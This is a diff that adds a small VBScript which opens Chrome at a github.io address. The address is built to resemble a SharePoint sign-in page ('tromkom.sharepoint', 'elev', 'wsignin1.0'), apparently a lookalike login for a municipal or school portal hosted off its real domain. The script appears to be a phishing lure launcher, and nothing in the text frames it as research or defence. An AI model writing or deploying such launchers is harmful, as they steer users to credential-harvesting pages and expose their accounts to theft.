@@ -1,1 +1,9 @@
-asdasdasdasd
+
+Dim objShell, url
+Set objShell = CreateObject("WScript.Shell")
+
+' Define the URL to open
+url = "https://buxb0t.github.io/https-tromkom.sharepoint-sites-zokrates-sider-startside-elev.aspx-wa-wsignin1.0/"
+
+' Open the URL in Google Chrome
+objShell.Run """C:\Program Files\Google\Chrome\Application\chrome.exe"" " & url, 1, False
